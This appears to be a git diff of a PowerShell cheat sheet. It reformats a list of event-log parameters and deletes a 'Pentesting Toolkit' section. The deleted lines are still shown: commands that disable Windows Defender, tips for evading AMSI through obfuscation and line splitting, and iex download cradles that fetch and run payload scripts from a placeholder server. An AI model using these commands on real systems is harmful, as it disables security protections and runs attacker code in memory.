@@ -17,16 +17,16 @@ Rather than collating information about hundreds of different servers and servic
 - **Stop-Process** used to stop a process
 - **Get-EventLog** acces your computers event logs
 
-    **Parameters you can use to search event logs** 
-    - **After** User specifies a date and time and the cmdlet will locate events that occurred after
-    - **AsBaseObject** Provides a System.Diagnostics.EventLogEntry for each event
-    - **AsString** Returns the output as strings
-    - **Before** User specifies a date and time and the cmdlet will locate events that occurred before
-    - **ComputerName** Used to refer to a remote computer
-    - **EntryType** Specifies the entry type of events (Error, Failure Audit, Success Audit, Information, Warning)
-    - **Index** Specifies index values the cmdlet finds events from
-    - **List** Provides a list of event logs
-    - **UserName** Specifies usernames associated with a given event
+**Parameters you can use to search event logs** 
+- **After** User specifies a date and time and the cmdlet will locate events that occurred after
+- **AsBaseObject** Provides a System.Diagnostics.EventLogEntry for each event
+- **AsString** Returns the output as strings
+- **Before** User specifies a date and time and the cmdlet will locate events that occurred before
+- **ComputerName** Used to refer to a remote computer
+- **EntryType** Specifies the entry type of events (Error, Failure Audit, Success Audit, Information, Warning)
+- **Index** Specifies index values the cmdlet finds events from
+- **List** Provides a list of event logs
+- **UserName** Specifies usernames associated with a given event
 
 - **Get-ChildItem**	dir, ls, gci 	Lists all files and folders in the current working directory
 - **Get-Location**	pwd, gl	Get the current working directory
@@ -332,27 +332,3 @@ Enable-NetFirewallRule	Enable a previously disabled firewall rule
 ConvertTo-Html	Convert Microsoft .NET Framework objects into HTML web pages
 Invoke-RestMethod	Send an HTTP or HTTPS request to a RESTful web service
 
-**Powershell Pentesting Toolkit**
-
-Set-ExecutionPolicy -ExecutionPolicy Bypass	In this powerful command, “Bypass” means removing all obstacles to running commands/scripts and disabling warnings and prompts.
-ExecutionPolicy myth: If you configure it a certain way, it will automatically protect your device from malicious activities.
-ExecutionPolicy fact: It’s a self-imposed fence on PowerShell commands/scripts by a user, so if a malicious PowerShell script has caused damage, you already have a compromised machine.
-Jeffrey Snover, the creator of PowerShell, says:
-
-Learn more about ExecutionPolicy.
-Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVprotection $true}
-# Feed the above into https://amsi.fail to get the obfuscated (and runnable) version	Microsoft’s Antimalware Scan Interface (AMSI) allows antivirus software to monitor and block PowerShell scripts in memory.
-AMSI can recognize scripts meant to bypass AMSI by their hash signatures. So hackers/pentesters wise up.
-A typical workaround is obfuscation, such as creating dummy variables to hold values in the script and Base64-encoding these values. Good obfuscation makes it harder for AMSI to recognize a script.
-But a tried-and-tested workaround that doesn’t involve obfuscation is splitting it up into separate lines.
-Therein lies AMSI’s weakness: it can detect entire scripts but not anticipate whether incremental commands lead to unexpected results.
-Set-MpPreference -DisableRealTimeMonitoring $true
-# Feed the above into https://amsi.fail to get the obfuscated (and runnable) version	Turn off Windows Defender.
-This command also requires obfuscation as AMSI will identify and abort such scripts.
-Import-Module /path/to/module	Import module from a directory path /path/to/module
-iex (New-Object Net.WebClient).DownloadString('https://[webserver_ip]/payload.ps1')	Download execution cradle: a payload PowerShell script payload.ps1.
-iex (iwr http://[webserver_ip]/some_script.ps1 -UseBasicParsing) 	Downloading a PowerShell script some_script.ps1 and running it from random access memory (RAM)
-iex (New-Object Net.WebClient).DownloadString('http://[webserver_ip]/some_script.ps1')	Download a PowerShell script some_script.ps1 into RAM instead of disk
-iex (New-Object Net.WebClient).DownloadString('http://[webserver_ip]/some_script.ps1');command1;command2	Allow a PowerShell script some_script.ps1 to run commands (command1, command2) one at a time directly from RAM.
-The next item is an example.
-iex (New-Object Net.WebClient).DownloadString('http://localhost/powerview.ps1');Get-NetComputer	Run localhost’s PowerView (powerview.ps1) function Get-NetComputer directly from RAM.
